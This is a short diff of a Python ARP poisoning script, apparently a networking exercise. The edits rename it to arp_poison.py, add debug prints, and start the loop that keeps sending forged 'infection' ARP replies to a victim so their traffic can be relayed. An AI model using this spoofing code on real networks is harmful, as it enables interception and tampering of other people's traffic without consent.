@@ -13,9 +13,11 @@ gateway_ip = None
 
 
 def send_periodically(infection_reply, interval_sec=1):
+    print 'ppp'
     pcap_handle = pcap.pcap(timeout_ms=0)
     while True:
         pcap_handle.sendpacket(infection_reply.as_bytes())
+        print '[<+] Periodical packet sent'
         gevent.sleep(interval_sec)
 
 
@@ -52,7 +54,7 @@ def relay_ip(from_ip, to_ip):
 def main():
     global victim_ip, victim_mac, gateway_ip
     if len(sys.argv) != 2:
-        print 'Usage: python send_arp.py <victim ip>'
+        print 'Usage: python arp_poison.py <victim ip>'
         exit(1)
 
     device_name = pcap.lookupdev()
@@ -71,7 +73,7 @@ def main():
 
     asking_arp = normal_request_arp(my_mac, my_ip, victim_ip)
     pcap_handle.sendpacket(asking_arp.as_bytes())
-    print '[<+] Sent victim({}) a ARP request'.format(victim_ip)
+    print '[<+] Sent victim({}) an ARP request'.format(victim_ip.in_string)
 
     # wait for victim's response
     for capture in pcap_handle:
@@ -96,6 +98,8 @@ def main():
     pool = Pool()
     replier = pool.spawn(reply_to_request, infection_arp)
     periodical = pool.spawn(send_periodically, infection_arp)
+    periodical.start()
+    pool.join()
 
 
 if __name__ == '__main__':
